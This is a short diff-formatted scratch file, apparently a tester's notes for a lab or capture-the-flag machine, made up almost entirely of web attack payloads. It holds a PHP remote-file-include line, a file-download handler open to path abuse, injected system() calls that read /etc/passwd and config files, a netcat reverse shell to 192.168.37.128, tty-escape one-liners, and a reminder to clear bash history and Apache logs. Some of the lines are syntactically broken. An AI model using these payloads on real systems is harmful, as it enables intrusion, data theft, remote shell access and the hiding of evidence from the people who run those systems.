@@ -1,0 +1,59 @@
+<script type="text/javascript">
+document.cookie = "USECURITYID=abcdefg;path=/";
+document.write(document.cookie);
+</script>
+
+$_page = $_GET [http://192.168.37.128:8000/script.py];
+include ($page);
+
+  $filename = $_GET["index.php"]; 
+  ob_end_clean();
+  header("Content-Type: application/octet-stream; "); 
+  header("Content-Transfer-Encoding: binary"); 
+  header("Content-Length: ". filesize($filename).";"); 
+  header("Content-disposition: attachment; filename=" . $filename);
+  readfile($filename);
+  die();
+
+
+'. file_get_contents("http://192.168.37.128/htdocs/index.php"); . '
+
+'. echo shell_exec("nc 192.168.37.128 4422"); .'
+'. . '
+//works
+'. system("ls") .'
+'. system("ls") .'
+'. system("cat /etc/passwd") .'
+
+'. system("nc -e /bin/sh 192.168.37.128 1234") .'
+
+escape tty shell
+python -c 'import pty; pty.spawn("/bin/sh")'
+echo os.system('/bin/bash')
+/bin/sh -i
+
+'. system("cat index.php") .'  php -f index.php
+
+//view source
+'. system("php -r show_source("/var/www/html/htdocs/index.php", true)) .'
+
+
+
+
+'.  php -r 'echo  show_source("/var/www/html/htdocs/index.php", true) ;' .'
+
+'. show_source("htbdetails.page", true) ; .'
+'. show_source("../etc/config", true); .'
+
+'.  system("cat ../etc/config"); .'
+
+'. echo file_get_contents("index.php"); .'
+
+
+
+//works for show source
+php -r 'echo show_source("index.php", true);'
+
+clear log history, bash history, apache logs
+
+'. include_once 'footer.php'; .'
